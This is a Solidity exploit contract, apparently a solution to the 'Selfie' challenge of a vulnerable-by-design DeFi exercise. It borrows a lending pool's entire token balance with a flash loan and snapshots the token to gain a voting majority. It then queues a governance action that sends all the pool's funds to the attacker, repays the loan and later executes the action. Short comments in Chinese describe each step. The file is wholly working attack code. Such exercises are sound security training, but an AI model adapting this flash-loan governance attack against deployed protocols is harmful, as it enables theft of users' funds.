// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IERC20Snapshot {
    function snapshot() external returns (uint256);
}

contract SelfieAttack {
    ISelfiePool pool;
    ISimpleGovernance governance;
    IERC20Snapshot token;
    address attacker;
    uint256 actionId;
    
    constructor(address _pool, address _governance, address _token) public {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        token = IERC20Snapshot(_token);
        attacker = msg.sender;
    }
    
    function attack() external {
        uint256 poolBalance = IERC20(address(token)).balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }
    
    function receiveTokens(address, uint256 amount) external {
        // 快照：现在我们拥有 >50% 的代币
        token.snapshot();
        
        // 提案：调用 pool.drainAllFunds(attacker)
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = governance.queueAction(address(pool), data, 0);
        
        // 归还闪电贷
        IERC20(address(token)).transfer(msg.sender, amount);
    }
    
    function executeGovernanceAction() external {
        governance.executeAction(actionId);
    }
}
